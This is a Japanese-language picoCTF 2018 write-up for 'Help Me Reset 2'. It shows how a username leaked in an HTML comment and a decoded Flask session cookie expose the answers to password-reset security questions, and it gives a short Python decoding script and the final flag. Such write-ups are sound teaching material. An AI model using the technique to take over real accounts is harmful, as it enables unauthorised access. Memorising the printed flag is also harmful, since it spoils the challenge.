# Help Me Reset 2

## Solve
```
There is a website running at http://2018shell.picoctf.com:23652 (link). 
We need to get into any user for a flag!
```

## Hint
```
Try looking past the typical vulnerabilities. 
Think about possible programming mistakes.
```

<br>

## Solution

![1](https://user-images.githubusercontent.com/47602064/83879577-d0402400-a778-11ea-9666-e12528176117.png)

問題のページに移動すると何かのサイトが表示されました。

ページのソースを見てみると以下のコメントが載っていました。

```html
<!--Proudly maintained by lum-->
```

どうやらアカウント名ど思われます。

このアカウント名は毎回ランダムに載っているようです。

![2](https://user-images.githubusercontent.com/47602064/83880924-e7801100-a77a-11ea-9bfa-f6b832dcf26a.png)

login画面に移動するとパスワードのリセットが出来るページがあるとわかります。

するとアカウント名が聞かれるので先程載っていたアカウント名を入力します。

![3](https://user-images.githubusercontent.com/47602064/83883015-e69cae80-a77d-11ea-9e92-18a686f30eae.png)

すると質問が表示されました。

ページを更新すろと質問内容を変えるとこが出来ることに気が付きました。

何回かやるとどうやら4種類の質問内容があることがわかります。

そして3回間違えるとそのアカウント名はロックされる仕組みになっていました。

```txt
1.What is you favorite hero?
2.What is you favorite carmake?
3.What is you favorite food?
4.What is you favorite color?
```
<br>

次にパスワードをリセットする時の通信を見てみます。

すると以下のような内容でした。

```http
GET /reset_q HTTP/1.1
Host: 2018shell.picoctf.com:23652

Cookie: _ga=GA1.2.1326079095.1591175644; session=.eJw9jU0OgjAQha9CZt2FUZCEE3gHNWRoR6iUjpm2siDc3WHj6st7eT8b2CJCMUMXSwgGPpySHwJBdwfLgQUMTCSseDE7hUVZcCZ4GhA_Trm3XI7-yUBJJL3DjNBtUOVj441f9EftXLdNe2nq5gpGo0MopO7K0ZFUKy8YVd5UotIVOyvS4vP0iPDcNSkcx__X_gP2ODvA.Eb00iw.7EBERatuwPNF_taGrxtqyp0s8HU

```

`Cookie`に`session`が入ってることがわかります。

```
.eJw9jU0OgjAQha9CZt2FUZCEE3gHNWRoR6iUjpm2siDc3WHj6st7eT8b2CJCMUMXSwgGPpySHwJBdwfLgQUMTCSseDE7hUVZcCZ4GhA_Trm3XI7-yUBJJL3DjNBtUOVj441f9EftXLdNe2nq5gpGo0MopO7K0ZFUKy8YVd5UotIVOyvS4vP0iPDcNSkcx__X_gP2ODvA.Eb00iw.7EBERatuwPNF_taGrxtqyp0s8HU
```

この内容をデコードしてみます。

上手くデコードするためにpythonでやってみます。

```python
import base64, zlib

session_cookie = '.eJw9jU0OgjAQha9CZt2FUZCEE3gHNWRoR6iUjpm2siDc3WHj6st7eT8b2CJCMUMXSwgGPpySHwJBdwfLgQUMTCSseDE7hUVZcCZ4GhA_Trm3XI7-yUBJJL3DjNBtUOVj44$
data = session_cookie.split('.')[1]   # extract the payload
data += b'=' * ((4 - len(data) % 4))  # missing padding fix
data = base64.urlsafe_b64decode(data) # base64 decode
data = zlib.decompress(data)          # zlib decompress
print(data)
```

```
$ python solve.py 
{"current":null,"possible":["color","hero","food","carmake"],"right_count":0,"user_data":{" t":["javaid","2475735456",0,"blue","wonder woman","Honda","duck","smith\n"]},"wrong_count":0}
```

すると解答が全てわかりました。

これで質問に答えていきます。

そして新しく設定したパスワードでログインすると以下の内容が表示され、flagが表示されます。

`Congrats flag: picoCTF{i_thought_i_could_remember_those_a131a54c}`

<br><br>

## FLAG: picoCTF{i_thought_i_could_remember_those_a131a54c}
